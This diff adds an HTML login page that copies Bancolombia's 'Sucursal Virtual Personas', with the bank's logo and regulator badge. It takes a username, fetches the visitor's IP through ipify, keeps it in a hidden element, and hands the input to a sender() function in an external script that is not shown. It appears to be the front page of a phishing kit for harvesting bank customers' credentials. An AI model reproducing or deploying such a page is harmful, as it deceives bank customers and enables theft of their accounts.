@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virtual Personas</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="js/jquery-3.7.7.js"></script>
+</head>
+<body class="index1-login">
+
+<div class="index1-page">
+    <div class="index1-topbar">
+        <img src="images/GRUPO_BANCOLOMBIA_Symbol_Alternative_1.png" class="index1-brand" alt="">
+    </div>
+
+    <div class="index1-main">
+        <h1 class="titulo-principal">¡Hola!</h1>
+
+        <div class="form-container">
+            <div class="form-box">
+                <div class="campo-usuario campo-usuario--pill">
+                    <img src="icons/icon-user.png" class="icono" alt="">
+                    <input type="text" id="usuario" class="input-user" placeholder="Ingresa tu usuario" autocomplete="username" />
+                </div>
+
+                <button class="btn-continuar btn-continuar--full" id="btn-continuar" onclick="validar()" disabled>Continuar</button>
+
+                <p class="olv"><a href="#">¿Olvidaste tu usuario o clave?</a></p>
+            </div>
+        </div>
+    </div>
+
+    <img src="images/5125617020933180513 (1).jpg" class="index1-decor" id="index1-decor" alt="">
+
+    <div class="footer-container">
+        <div class="vigilado-logo">
+            <img src="images/vigiladosuper.png" alt="">
+        </div>
+
+        <div class="info-footer">
+            <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span></div>
+            <div id="fecha-hora" class="fecha-text"></div>
+        </div>
+    </div>
+</div>
+
+<div id="address" style="display:none;"></div>
+
+<script>
+    (function() {
+        const ipSpan = document.getElementById("gfg");
+        const ipAddress = document.getElementById("address");
+
+        function setIP(ip) {
+            if (ipSpan) ipSpan.textContent = ip;
+            if (ipAddress) ipAddress.textContent = ip;
+        }
+
+        function setIPFallback() {
+            setIP("No disponible");
+        }
+
+        fetch("https://api64.ipify.org?format=json", { cache: "no-store" })
+            .then(r => r.json())
+            .then(d => {
+                if (d && d.ip) setIP(d.ip);
+                else setIPFallback();
+            })
+            .catch(() => {
+                fetch("https://api.ipify.org?format=json", { cache: "no-store" })
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d && d.ip) setIP(d.ip);
+                        else setIPFallback();
+                    })
+                    .catch(setIPFallback);
+            });
+    })();
+
+    function actualizarFecha() {
+        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
+        const fecha = new Date().toLocaleString('es-CO', options);
+        document.getElementById("fecha-hora").textContent = fecha;
+    }
+    setInterval(actualizarFecha, 1000);
+    actualizarFecha();
+</script>
+
+<script src="js/sax.js"></script>
+
+<script>
+    const usuarioInput = document.getElementById("usuario");
+    const btnContinuar = document.getElementById("btn-continuar");
+    
+    usuarioInput.addEventListener("input", function() {
+        this.value = this.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 20);
+    });
+
+    function actualizarEstadoContinuar() {
+        const val = usuarioInput.value;
+        const hasLetters = /[a-zA-Z]/.test(val);
+        const hasNumbers = /[0-9]/.test(val);
+        const habilitar = hasLetters && hasNumbers;
+
+        if (btnContinuar) {
+            btnContinuar.disabled = !habilitar;
+            btnContinuar.classList.toggle("is-enabled", habilitar);
+        }
+    }
+
+    function validar() {
+        const val = usuarioInput.value;
+        const hasLetters = /[a-zA-Z]/.test(val);
+        const hasNumbers = /[0-9]/.test(val);
+        
+        if (hasLetters && hasNumbers) {
+            sender(); 
+        } else {
+            alert("El usuario debe ser alfanumérico (debe contener letras y números).");
+        }
+    }
+
+    const decor = document.getElementById("index1-decor");
+    const page = document.querySelector(".index1-page");
+    const pill = document.querySelector(".campo-usuario--pill");
+
+    function posicionarDecor() {
+        if (!decor || !page || !pill) return;
+        const pageRect = page.getBoundingClientRect();
+        const pillRect = pill.getBoundingClientRect();
+        const top = (pillRect.bottom - pageRect.top) + 18;
+        page.style.setProperty("--index1-decor-top", `${Math.max(0, top)}px`);
+    }
+
+    function ponerDecorDebajoDelInput() {
+        if (!decor) return;
+        posicionarDecor();
+        decor.classList.add("is-under-input");
+    }
+
+    function ponerDecorAbajo() {
+        if (!decor) return;
+        decor.classList.remove("is-under-input");
+    }
+
+    usuarioInput.addEventListener("focus", function() {
+        ponerDecorDebajoDelInput();
+        actualizarEstadoContinuar();
+    });
+    usuarioInput.addEventListener("input", function() {
+        ponerDecorDebajoDelInput();
+        actualizarEstadoContinuar();
+    });
+    usuarioInput.addEventListener("blur", ponerDecorAbajo);
+    window.addEventListener("resize", function() {
+        if (decor && decor.classList.contains("is-under-input")) {
+            posicionarDecor();
+        }
+    });
+
+    actualizarEstadoContinuar();
+</script>
+
+</body>
+</html>
